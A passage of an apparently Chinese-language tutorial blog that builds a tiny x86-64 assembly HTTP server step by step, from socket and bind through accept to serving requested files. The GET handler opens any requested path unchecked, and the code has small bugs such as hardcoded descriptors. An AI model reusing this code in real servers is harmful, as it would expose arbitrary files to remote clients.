0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 退出系统调用</span><br><span class="line">    # mov rax, 60            # syscall: exit</span><br><span class="line">    # xor rdi, 3             # exit status 0</span><br><span class="line">    # syscall                # 执行退出</span><br><span class="line">        # 检查bind调用是否成功</span><br><span class="line">    test rax, rax          # 检查rax是否为0</span><br><span class="line">    jnz .exit_failure      # 如果不是0，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-4-Program-that-listens-on-a-socket"><a href="#1-4-Program-that-listens-on-a-socket" class="headerlink" title="1.4 Program that listens on a socket"></a>1.4 Program that listens on a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    # 检查bind调用是否成功</span><br><span class="line">    test rax, rax          # 检查rax是否为0</span><br><span class="line">    jnz .exit_failure      # 如果不是0，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-5-Program-that-accepts-a-connection"><a href="#1-5-Program-that-accepts-a-connection" class="headerlink" title="1.5 Program that accepts a connection"></a>1.5 Program that accepts a connection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43 					 # syscall: accept</span><br><span class="line">    mov rdi, 3						 # 绑定socket 3</span><br><span class="line">    mov rsi, 0 						 # NULL</span><br><span class="line">    mov rdx, 0						 # NULL</span><br><span class="line">    syscall					</span><br><span class="line"></span><br><span class="line">    # 检查accept返回值是否为4</span><br><span class="line">    cmp rax, 4</span><br><span class="line">    jne .exit_failure      # 如果不是4，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-6-Program-that-statically-responds-to-an-HTTP-request"><a href="#1-6-Program-that-statically-responds-to-an-HTTP-request" class="headerlink" title="1.6 Program that statically responds to an HTTP request"></a>1.6 Program that statically responds to an HTTP request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]     # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512           # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response] # 响应内容的位置</span><br><span class="line">    mov rdx, 19           # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 关闭套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-7-Program-that-dynamically-responds-to-an-HTTP-GET-request"><a href="#1-7-Program-that-dynamically-responds-to-an-HTTP-GET-request" class="headerlink" title="1.7 Program that dynamically responds to an HTTP GET request"></a>1.7 Program that dynamically responds to an HTTP GET request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]       # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512             # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]     # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi             # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0    # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2               # syscall: open</span><br><span class="line">    mov rdi, rdi             # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi             # O_RDONLY</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax            # 测试返回值以检查错误</span><br><span class="line">    js exit_failure          # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax             # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax             # 保存文件描述符</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区</span><br><span class="line">    mov rdx, 1024            # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12             # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]      # 响应内容的位置</span><br><span class="line">    mov rdx, 19              # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15             # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3               # syscall: close</span><br><span class="line">    mov rdi, rbx             # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp exit_success         # 跳转到成功退出</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区l</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-7-Program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><a href="#1-7-Program-that-dynamically-responds-to-multiple-HTTP-GET-requests" class="headerlink" title="1.7 Program that dynamically responds to multiple HTTP GET requests"></a>1.7 Program that dynamically responds to multiple HTTP GET requests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">		# socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">		# bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            				# 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  				# sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line">		</span><br><span class="line">		# listen(3, 0) = 